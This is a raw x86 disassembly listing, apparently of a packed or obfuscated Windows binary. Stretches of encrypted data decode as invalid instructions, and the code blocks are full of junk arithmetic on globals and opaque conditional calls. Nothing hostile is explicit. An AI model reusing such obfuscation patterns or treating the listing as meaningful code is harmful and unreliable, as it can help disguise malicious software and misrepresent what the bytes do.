  418711:	jle    0x41876c
  418713:	jae    0x41873e
  418715:	xchg   esp,eax
  418716:	call   0x3d861f84
  41871b:	pcmpeqw mm6,mm5
  41871e:	jns    0x41876b
  418720:	sbb    eax,0xf018dcf7
  418725:	pop    edx
  418726:	push   edx
  418727:	jns    0x41878a
  418729:	rcr    ch,cl
  41872b:	sub    al,0x3e
  41872d:	int3   
  41872e:	adc    al,0x7b
  418730:	mov    ah,0x87
  418732:	(bad)  
  418733:	aad    0x36
  418735:	scas   eax,DWORD PTR es:[edi]
  418736:	push   edx
  418737:	or     DWORD PTR [edx-0x62],esp
  41873a:	clc    
  41873b:	cmc    
  41873c:	pop    eax
  41873d:	pop    esp
  41873e:	mov    DWORD PTR ds:0x365ca21,edx
  418744:	or     edx,edx
  418746:	dec    eax
  418747:	mov    ecx,esp
  418749:	outs   dx,DWORD PTR ds:[esi]
  41874a:	pop    ds
  41874b:	jb     0x4186e6
  41874d:	jle    0x418748
  41874f:	mov    cr2,ebp
  418752:	ds sub al,0x6c
  418755:	xor    edx,DWORD PTR [edi+0x4b]
  418758:	retf   
  418759:	clc    
  41875a:	call   0x51aed5
  41875f:	pop    edx
  418760:	sahf   
  418761:	inc    eax
  418762:	jae    0x4186f4
  418764:	xor    DWORD PTR [ebx+0x5bde7728],ecx
  41876a:	mov    eax,0x9536a9fd
  41876f:	dec    eax
  418770:	add    cl,BYTE PTR [edi]
  418772:	push   edx
  418773:	mov    dl,0x5a
  418775:	mov    BYTE PTR [ecx+ecx*1-0x56],dl
  418779:	mov    ah,0x5d
  41877b:	mov    ds:0x14ed26be,eax
  418780:	dec    edi
  418781:	ins    DWORD PTR es:[edi],dx
  418782:	push   ebp
  418783:	cmp    ebp,DWORD PTR [ecx-0xe]
  418786:	jnp    0x4a8b93af
  41878c:	pop    esi
  41878d:	ss lods eax,DWORD PTR cs:[esi]
  418790:	lods   eax,DWORD PTR ds:[esi]
  418791:	js     0x418808
  418793:	inc    ebp
  418794:	xor    al,0x28
  418796:	pop    es
  418797:	cdq    
  418798:	sub    DWORD PTR [eax+0x67b5f207],ebx
  41879e:	jmp    0xbd2b:0x68d8655
  4187a5:	dec    eax
  4187a6:	fisubr DWORD PTR [edx-0x71]
  4187a9:	mov    ch,al
  4187ab:	adc    ch,dh
  4187ad:	and    al,0xbb
  4187af:	add    BYTE PTR [ebx],bl
  4187b1:	xchg   ecx,eax
  4187b2:	(bad)  
  4187b3:	fdiv   QWORD PTR [ebp+0x32]
  4187b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187b7:	and    ebx,edi
  4187b9:	inc    esi
  4187ba:	sbb    DWORD PTR [esp+ecx*1-0xfc089ed],eax
  4187c1:	inc    esi
  4187c2:	loope  0x418811
  4187c4:	adc    ecx,ebp
  4187c6:	xor    ebx,DWORD PTR [ecx+0x6c57cf2]
  4187cc:	out    dx,al
  4187cd:	(bad)  
  4187ce:	cmp    eax,ebp
  4187d0:	daa    
  4187d1:	ret    
  4187d2:	jg     0x4187b8
  4187d4:	push   eax
  4187d5:	fsubr  QWORD PTR [edi]
  4187d7:	sub    ebp,DWORD PTR [esi+esi*8-0x25]
  4187db:	mov    edi,0xbdb07069
  4187e0:	sub    DWORD PTR [ebx+0x2b],0xdab1b0dd
  4187e7:	das    
  4187e8:	rol    BYTE PTR [ebx],cl
  4187ea:	fnstsw WORD PTR [ecx+0xb4d2eef]
  4187f0:	in     eax,0xf4
  4187f2:	cld    
  4187f3:	popf   
  4187f4:	(bad)  
  4187f5:	jl     0x4187c2
  4187f7:	outs   dx,BYTE PTR ds:[esi]
  4187f8:	sbb    eax,0xfffedec9
  4187fd:	mov    edi,0x50e582ba
  418802:	clc    
  418803:	enter  0xa2cf,0xd9
  418807:	mov    edi,DWORD PTR [ecx+0x2c]
  41880a:	push   0x43de6237
  41880f:	sub    eax,0xddfdefa0
  418814:	pushf  
  418815:	popf   
  418816:	push   cs
  418817:	cli    
  418818:	rcl    BYTE PTR [edx+0x7f491607],cl
  41881e:	imul   DWORD PTR [ebp-0x78]
  418821:	jg     0x4187f2
  418823:	mov    esp,0x33d57f15
  418828:	(bad)  
  418829:	leave  
  41882a:	cmc    
  41882b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41882c:	gs iret 
  41882e:	mov    edx,DWORD PTR fs:0xe48ae770
  418835:	fimul  DWORD PTR [esi+0x43]
  418838:	jae    0x41888e
  41883a:	rcr    DWORD PTR [ebx],cl
  41883c:	push   eax
  41883d:	test   BYTE PTR [ecx-0x18e0cba8],al
  418843:	cmp    dh,dl
  418845:	adc    BYTE PTR [ecx-0x1eabf191],bh
  41884b:	push   edi
  41884c:	rcr    BYTE PTR [eax],cl
  41884e:	cli    
  41884f:	fs xor dl,ch
  418852:	or     ecx,esi
  418854:	pop    ebx
  418855:	jp     0x418898
  418857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418858:	mov    ah,0x1b
  41885a:	adc    edx,DWORD PTR [edi-0x3c]
  41885d:	idiv   DWORD PTR [eax-0x26]
  418860:	inc    ecx
  418861:	mov    ss,ebp
  418863:	call   0xf2c63ae4
  418868:	inc    esi
  418869:	stos   BYTE PTR es:[edi],al
  41886a:	ret    
  41886b:	push   eax
  41886c:	add    eax,DWORD PTR [edx]
  41886e:	mov    dl,0x39
  418870:	dec    ebp
  418871:	mov    ds:0x3e975f68,eax
  418876:	inc    edx
  418877:	(bad)  
  418878:	dec    esi
  418879:	ja     0x4188a0
  41887b:	ret    
  41887c:	loop   0x41881b
  41887e:	pop    ecx
  41887f:	cwde   
  418880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418881:	loopne 0x4188cf
  418883:	ret    0x90a
  418886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418887:	test   bl,0x78
  41888a:	in     al,0x61
  41888c:	call   0x14e419b4
  418891:	sbb    BYTE PTR es:[edi+0x2e],bl
  418895:	std    
  418896:	push   eax
  418897:	fs popa 
  418899:	cld    
  41889a:	xchg   ecx,eax
  41889b:	fisub  WORD PTR [ebp+0x7116281]
  4188a1:	xchg   edi,eax
  4188a2:	pop    ebp
  4188a3:	inc    edx
  4188a4:	sub    BYTE PTR [ebx+0x13],dh
  4188a7:	test   eax,0x791405aa
  4188ac:	mov    al,0x37
  4188ae:	cwde   
  4188af:	into   
  4188b0:	pop    eax
  4188b1:	sahf   
  4188b2:	cdq    
  4188b3:	pop    ss
  4188b4:	out    dx,al
  4188b5:	mov    ecx,DWORD PTR [esp+0x48]
  4188b9:	or     DWORD PTR ds:0x42821b,0x42820b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428133
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428223,0x42827b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42816f,0x428273
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42821f,0x42835f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42825b,0x7154
  418909:	call   DWORD PTR ds:0x428d88
  41890f:	or     DWORD PTR ds:0x428273,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428377,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x4282ff,0x0
  418935:	mov    DWORD PTR ds:0x4282df,ebx
  41893b:	mov    DWORD PTR ds:0x428263,ebx
  418941:	mov    esi,DWORD PTR ds:0x428233
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x4282ff,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dcc
  41896e:	movzx  esi,WORD PTR ds:0x428303
  418975:	sbb    DWORD PTR ds:0x428143,esi
  41897b:	adc    DWORD PTR ds:0x42834f,0x5f0e
  418985:	xor    DWORD PTR ds:0x428387,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428217
  418991:	xor    esi,DWORD PTR ds:0x428153
  418997:	mov    DWORD PTR ds:0x428217,esi
  41899d:	add    DWORD PTR ds:0x428227,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428383,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42835b,0x42821b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428143,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x4282fb,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428283
  4189ec:	mov    edx,DWORD PTR ds:0x42820b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428383,0x606f
  418a03:	mov    DWORD PTR ds:0x42815f,ebx
  418a09:	cmp    DWORD PTR ds:0x4282fb,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428dd0
  418a1c:	adc    DWORD PTR ds:0x42813b,ebx
  418a22:	or     DWORD PTR ds:0x42823f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x4281ef
  418a34:	mov    edx,DWORD PTR ds:0x428313
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428303
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428287,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428383,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42825b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428377,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42813b
  418a85:	mov    eax,ds:0x42827b
  418a8a:	cmp    DWORD PTR ds:0x428383,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e70
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428353,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428263,edi
  418ac0:	or     DWORD PTR ds:0x42825b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42834f,ebx
  418ad0:	mov    eax,ds:0x422538
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42815b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0x63b0b184
  418af3:	in     al,dx
  418af4:	mov    esi,DWORD PTR [eax-0x66]
  418af7:	retf   
  418af8:	push   ss
  418af9:	sbb    BYTE PTR [edx+edx*1-0x7569e7e8],bh
  418b00:	in     eax,0x2e
  418b02:	mov    fs,WORD PTR [edi-0x6b]
  418b05:	push   eax
  418b06:	outs   dx,BYTE PTR ds:[esi]
  418b07:	or     cl,al
  418b09:	xor    al,0xb5
  418b0b:	xor    bl,BYTE PTR [ebp+0x6202a577]
  418b11:	jmp    0x9647:0x86776862
  418b18:	test   eax,0x5125101a
  418b1d:	jmp    0x6a9f90e5
  418b22:	js     0x418b15
  418b24:	sub    eax,0xb590d35f
  418b29:	lods   eax,DWORD PTR ds:[esi]
  418b2a:	(bad)  
  418b2b:	ins    BYTE PTR es:[edi],dx
  418b2c:	mov    cl,0xbc
  418b2e:	add    dl,al
  418b30:	push   cs
  418b31:	(bad)  
  418b32:	imul   BYTE PTR [edx+0x3bc6e368]
  418b38:	in     eax,dx
  418b39:	in     eax,0xfd
  418b3b:	popf   
  418b3c:	mov    WORD PTR [ebx],?
  418b3e:	lods   al,BYTE PTR ds:[esi]
  418b3f:	xor    eax,0xf9a36b2c
  418b44:	dec    ebx
  418b45:	fwait
  418b46:	enter  0xb294,0x46
  418b4a:	cmc    
  418b4b:	push   ecx
  418b4c:	outs   dx,BYTE PTR ds:[esi]
  418b4d:	scas   al,BYTE PTR es:[edi]
  418b4e:	inc    ebx
  418b4f:	sub    BYTE PTR [edi+0xf4a7a84],0xae
  418b56:	and    bh,BYTE PTR [ebp+0x38873ae0]
  418b5c:	pop    edx
  418b5d:	out    0x3c,eax
  418b5f:	adc    ecx,DWORD PTR [edi+0x22b23c5a]
  418b65:	add    cl,BYTE PTR [edx-0x80]
  418b68:	cmp    dh,BYTE PTR [ebp+0x51d0dec9]
  418b6e:	xchg   esp,eax
  418b6f:	jp     0x418ba6
  418b71:	cdq    
  418b72:	mov    edx,0xadba30fe
  418b77:	sbb    dl,BYTE PTR [ebx-0x64a81c4]
  418b7d:	mov    ah,0xb0
  418b7f:	loop   0x418b5c
  418b81:	shufps xmm2,xmm4,0x58
  418b85:	sbb    ebp,esi
  418b87:	jmp    0x298f:0x4091c09d
  418b8e:	inc    ecx
  418b8f:	idiv   DWORD PTR [esi+0x1b]
  418b92:	es add eax,0x22de9f63
  418b98:	out    0x8c,eax
  418b9a:	scas   eax,DWORD PTR es:[edi]
  418b9b:	jp     0x418b6d
  418b9d:	mov    cl,dh
  418b9f:	sub    eax,0x34af4f98
  418ba4:	xchg   ebp,eax
  418ba5:	push   ebx
  418ba6:	js     0x418bb2
  418ba8:	push   es
  418ba9:	xlat   BYTE PTR ds:[ebx]
  418baa:	mov    cl,0xa9
  418bac:	mov    BYTE PTR [eax+0x76a04313],cl
  418bb2:	shl    BYTE PTR [eax],0xd7
  418bb5:	scas   eax,DWORD PTR es:[edi]
  418bb6:	mov    al,ds:0xb0221b54
  418bbb:	in     eax,0x2e
  418bbd:	lahf   
  418bbe:	inc    edi
  418bbf:	sub    DWORD PTR [edi],esp
  418bc1:	clc    
  418bc2:	push   ss
  418bc3:	stc    
  418bc4:	nop
  418bc5:	es mov bl,0x52
  418bc8:	add    BYTE PTR [ecx+0x33a49b75],dl
  418bce:	outs   dx,BYTE PTR ds:[esi]
  418bcf:	les    ebx,FWORD PTR [eiz*2+0x4f71618b]
  418bd6:	sub    edi,DWORD PTR [ebp+0x6b4aab98]
  418bdc:	xchg   BYTE PTR [ecx],ch
  418bde:	mov    ch,al
  418be0:	mov    DWORD PTR [eax],edi
  418be2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418be3:	mov    ecx,0x3f050c0a
  418be8:	adc    al,0x11
  418bea:	in     al,0xf3
  418bec:	push   ecx
  418bed:	sbb    al,0x8b
  418bef:	push   ecx
  418bf0:	jno    0x418c47
  418bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf3:	xlat   BYTE PTR ds:[ebx]
  418bf4:	addr16 push esi
  418bf6:	mov    ds:0x7415386c,eax
  418bfb:	xchg   BYTE PTR [eax-0x7e],dl
  418bfe:	pusha  
  418bff:	add    DWORD PTR [ebp+0x2e77035c],0x59
  418c06:	mov    al,ds:0xb71f261f
  418c0b:	arpl   ax,di
  418c0d:	call   0x91a6:0xf5c05da9
  418c14:	aas    
  418c15:	neg    BYTE PTR [ecx-0x9121454]
  418c1b:	cmp    bl,BYTE PTR [ebp+edi*2-0x3fdad512]
  418c22:	rcl    DWORD PTR [ecx],1
  418c24:	mov    ebp,0xe7bf1d3b
  418c29:	mov    ah,0x6d
  418c2b:	adc    DWORD PTR [edx+0x5c],0x51930e7b
  418c32:	(bad)  
  418c33:	fcmovnu st,st(3)
  418c35:	pushf  
  418c36:	and    al,0x7c
  418c38:	mov    fs,WORD PTR [ebx+ebx*4]
  418c3b:	(bad)
  418c3e:	stc    
  418c3f:	sbb    BYTE PTR [eax],cl
  418c41:	jmp    0xed3f:0x13141e2a
  418c48:	adc    ecx,esi
  418c4a:	dec    ebx
  418c4b:	adc    dl,BYTE PTR [eax]
  418c4d:	scas   eax,DWORD PTR es:[edi]
  418c4e:	scas   al,BYTE PTR es:[edi]
  418c4f:	out    0x56,eax
  418c51:	add    eax,DWORD PTR [eax]
  418c53:	and    al,0xba
  418c55:	mov    esp,?
  418c57:	dec    ebx
  418c58:	jae    0x418bec
  418c5a:	jno    0x418c93
  418c5c:	sbb    al,BYTE PTR [edi-0x6d5ba0d1]
  418c62:	es in  eax,dx
  418c64:	call   0xd4ad:0xc1a6d9b
  418c6b:	adc    DWORD PTR [eax+0x544f9e87],ebx
  418c71:	aaa    
  418c72:	push   0xa4daba73
  418c77:	adc    eax,DWORD PTR [edi+0x12]
  418c7a:	cli    
  418c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c7c:	mov    ebx,0xfa1633e4
  418c81:	cli    
  418c82:	ror    BYTE PTR [ecx],0xe7
  418c85:	jmp    0x418cc0
  418c87:	(bad)  
  418c88:	cmp    eax,0xcece479b
  418c8d:	(bad)  
  418c8e:	loop   0x418cd3
  418c90:	fcmove st,st(3)
  418c92:	inc    BYTE PTR [eax+0x5b]
  418c95:	xor    cl,BYTE PTR [edx+0x12e0c2ae]
  418c9b:	sbb    bh,BYTE PTR [ecx-0x32]
  418c9e:	aaa    
  418c9f:	push   edx
  418ca0:	push   es
  418ca1:	push   ebp
  418ca2:	cmp    cl,al
  418ca4:	adc    eax,DWORD PTR [ecx+0xbb7d408]
  418caa:	sbb    ebp,edi
  418cac:	push   edi
  418cad:	aam    0x59
  418caf:	mov    DWORD PTR [edi+0x1908b7a4],0xc76e31c3
  418cb9:	xchg   esi,eax
  418cba:	imul   esi,esi,0xffffffe0
  418cbd:	leave  
  418cbe:	sbb    DWORD PTR [edx],esp
  418cc0:	lods   al,BYTE PTR ds:[esi]
  418cc1:	aam    0x70
  418cc3:	pop    edx
  418cc4:	fs loopne 0x418c56
  418cc7:	(bad)  
  418cc8:	mov    edi,0xaa493658
  418ccd:	into   
  418cce:	sub    DWORD PTR [esi],esi
  418cd0:	inc    eax
  418cd1:	sbb    al,0x10
  418cd3:	int    0xea
  418cd5:	mov    esi,0xec5489dc
  418cda:	cmp    DWORD PTR [esi+0x13],0x56
  418cde:	ins    DWORD PTR es:[edi],dx
  418cdf:	jle    0x418caa
  418ce1:	out    0x30,al
  418ce3:	inc    esi
  418ce4:	in     al,0x74
  418ce6:	or     eax,0xa2893671
  418ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cec:	fistp  DWORD PTR [edx-0x6a]
  418cef:	adc    BYTE PTR [ebp-0x60],0xc4
  418cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf4:	adc    eax,0x7dfb80ce
  418cf9:	cs sahf 
  418cfb:	cmp    BYTE PTR [ebp+0x2c],cl
  418cfe:	test   al,0x87
  418d00:	inc    edi
  418d01:	ss test eax,0xb9480838
  418d07:	leave  
  418d08:	in     eax,dx
  418d09:	sbb    DWORD PTR [esi+eiz*1+0x193f5859],ebp
  418d10:	dec    edi
  418d11:	mov    ebx,DWORD PTR [esi-0x1]
  418d14:	adc    DWORD PTR [ebx+0x27ed31a0],ecx
  418d1a:	mov    ebx,0x732e99f2
  418d1f:	pop    es
  418d20:	ret    
  418d21:	pusha  
  418d22:	ficomp DWORD PTR [edx]
  418d24:	fidiv  WORD PTR [edi+esi*4+0x42]
  418d28:	push   es
  418d29:	or     al,0xe
  418d2b:	sar    DWORD PTR [edx-0x14],cl
  418d2e:	rol    DWORD PTR [ebp-0x1f],0x24
  418d32:	aaa    
  418d33:	gs ins BYTE PTR es:[edi],dx
  418d35:	pop    edx
  418d36:	std    
  418d37:	and    edx,DWORD PTR [ebx-0x234e172a]
  418d3d:	mov    dh,0x1a
  418d3f:	popf   
  418d40:	shl    BYTE PTR gs:[ecx],cl
  418d43:	aam    0x32
  418d45:	call   0x1765:0x65531c3d
  418d4c:	pop    ebp
  418d4d:	cdq    
  418d4e:	jb     0x418dbb
  418d50:	out    0x72,al
  418d52:	cwde   
  418d53:	gs jne 0x418d30
  418d56:	sbb    edi,ebx
  418d58:	dec    esi
  418d59:	aad    0xc0
  418d5b:	(bad)  
  418d5c:	pop    ss
  418d5d:	cmp    ecx,DWORD PTR [edx-0xf]
  418d60:	aaa    
  418d61:	or     al,0xa1
  418d63:	pop    edi
  418d64:	fdivr  QWORD PTR [ecx+ecx*4]
  418d67:	or     al,bh
  418d69:	das    
  418d6a:	mov    fs:0x56a98595,al
  418d70:	call   0xae5:0x5513c667
  418d77:	or     DWORD PTR ds:[ecx+0x56e23d74],0x1b6dbba
  418d82:	aad    0xb7
  418d84:	cmp    DWORD PTR [esi-0xf],esp
  418d87:	push   ebx
  418d88:	repz jge 0x418d1a
  418d8b:	dec    esi
  418d8c:	xor    cl,BYTE PTR [ebp-0x4c]
  418d8f:	pop    esi
  418d90:	add    eax,0x21b1d6b
  418d95:	pusha  
  418d96:	inc    ebx
  418d97:	sub    eax,0xaf028645
  418d9c:	add    cl,BYTE PTR [edx-0x22]
  418d9f:	cdq    
  418da0:	xchg   ebp,eax
  418da1:	and    eax,0xcf6a167
  418da6:	retf   0x5975
  418da9:	push   ebx
  418daa:	xchg   di,ax
  418dac:	jbe    0x418d5b
  418dae:	loope  0x418e1b
  418db0:	ja     0x418da5
  418db2:	pop    ds
  418db3:	push   ds
  418db4:	call   0x978a:0x2dac527f
  418dbb:	adc    esi,ebp
  418dbd:	mov    ?,ebx
  418dbf:	push   cs
  418dc0:	push   0x26
  418dc2:	fisubr WORD PTR [ecx]
  418dc4:	in     al,dx
  418dc5:	mov    ch,0x11
  418dc7:	pop    es
  418dc8:	jno    0x418daa
  418dca:	ror    BYTE PTR ds:0x5f6cd173,1
  418dd0:	jle    0x418d94
  418dd2:	aad    0xaf
  418dd4:	add    al,0xc3
  418dd6:	add    ah,BYTE PTR [ecx+0x342591fa]
  418ddc:	pusha  
  418ddd:	rcl    DWORD PTR [ebp*8+0x7abdf7f9],cl
  418de4:	sub    ch,bl
  418de6:	nop
  418de7:	stos   DWORD PTR es:[edi],eax
  418de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de9:	loop   0x418e0f
  418deb:	sub    edi,esp
  418ded:	into   
  418dee:	fs inc esp
  418df0:	loope  0x418e2a
  418df2:	sbb    bh,BYTE PTR [ebx-0x4c]
  418df5:	and    eax,0xda508373
  418dfa:	(bad)  
  418dfb:	xor    BYTE PTR [esi],ah
  418dfd:	inc    ecx
  418dfe:	(bad)  
  418dff:	call   0x116c:0x3e6270df
  418e06:	xchg   ebp,eax
  418e07:	push   esp
  418e08:	push   ebx
  418e09:	mov    ds:0xc0d03b61,eax
  418e0e:	ds push 0x7f94ee9
  418e14:	call   0xfa64:0x62c8170c
  418e1b:	icebp  
  418e1c:	daa    
  418e1d:	or     DWORD PTR [eax+ecx*4-0x48f28b7d],0xffffffa5
  418e25:	xchg   esp,eax
  418e26:	pop    ss
  418e27:	jns    0x418e53
  418e29:	lock dec eax
  418e2b:	mov    ecx,0x47576442
  418e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e31:	outs   dx,BYTE PTR ds:[esi]
  418e32:	mov    ds:0x769a8607,eax
  418e37:	adc    BYTE PTR [ebp+0x53],0xf8
  418e3b:	into   
  418e3c:	mov    al,0x8a
  418e3e:	std    
  418e3f:	test   eax,0xa779ea82
  418e44:	or     al,0x74
  418e46:	sbb    al,0xa1
  418e48:	bound  eax,QWORD PTR ds:0x8a23e3a6
  418e4e:	fistp  DWORD PTR [ecx-0x58dd6d49]
  418e54:	jge    0x418dee
  418e56:	int    0x85
  418e58:	dec    DWORD PTR [ecx-0x14]
  418e5b:	jmp    0xe97943c5
  418e60:	inc    ebp
  418e61:	cmp    ecx,esi
  418e63:	jmp    0x418e4d
  418e65:	pushf  
  418e66:	das    
  418e67:	jbe    0x418e03
  418e69:	repz test al,0xc6
  418e6c:	ret    
  418e6d:	fidivr DWORD PTR [ebx]
  418e6f:	inc    esi
  418e70:	dec    ecx
  418e71:	call   0x1f5e9e49
  418e76:	into   
  418e77:	push   ebx
  418e78:	ins    DWORD PTR es:[edi],dx
  418e79:	sbb    BYTE PTR [ebx],ah
  418e7b:	adc    eax,0x70e63c46
  418e80:	xchg   edi,eax
  418e81:	push   ebx
  418e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e83:	dec    ebp
  418e84:	test   eax,0xd16535fe
  418e89:	mov    bl,0x8c
  418e8b:	mov    ds:0x1526fbfc,eax
  418e90:	fwait
  418e91:	data16 xor BYTE PTR [ebx],dh
  418e94:	not    BYTE PTR [eax-0x5078f106]
  418e9a:	in     eax,0x3
  418e9c:	clc    
  418e9d:	je     0x418eca
  418e9f:	cmp    al,0xce
  418ea1:	bound  esi,QWORD PTR [ebp+0x54ac0509]
  418ea7:	jp     0x418eca
  418ea9:	add    BYTE PTR [ebx+edi*4+0x446f8edd],bl
  418eb0:	mov    eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42837f,0x0
  418ec3:	mov    DWORD PTR ds:0x428147,0x216c
  418ecd:	mov    DWORD PTR ds:0x42824b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428243,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428253,0x562c
  418ef0:	mov    DWORD PTR ds:0x42827b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42837f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428307
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428dd4
  418f1a:	not    DWORD PTR ds:0x42817b
  418f20:	sub    DWORD PTR ds:0x42836f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428133
  418f32:	mov    edx,DWORD PTR ds:0x428277
  418f38:	sbb    DWORD PTR ds:0x42835b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282b3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x4282eb,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42836f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428383,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282db,0x0
  418f6c:	not    DWORD PTR ds:0x428247
  418f72:	not    DWORD PTR ds:0x428177
  418f78:	mov    DWORD PTR ds:0x4282cf,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x4282ff
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282db,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42835b
  418fb5:	call   DWORD PTR ds:0x428dd8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42820f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42816f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42835f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42816b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42814f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42813f,0x0
  41900e:	mov    DWORD PTR ds:0x428153,0x4347
  419018:	mov    DWORD PTR ds:0x428177,0x6064
  419022:	mov    DWORD PTR ds:0x42825f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428233,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42813f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428ddc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282cf
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42820b
  41906c:	or     DWORD PTR ds:0x42834f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi+0x870cbfe]
  419095:	mov    ah,0xe
  419097:	jle    0x4190d8
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1+0x6dff1818],bh
  4190a2:	clc    
  4190a3:	stc    
  4190a4:	push   esi
  4190a5:	sub    DWORD PTR [ecx+0x2f],esp
  4190a8:	or     BYTE PTR [ecx+eax*1-0x4b8f9346],ah
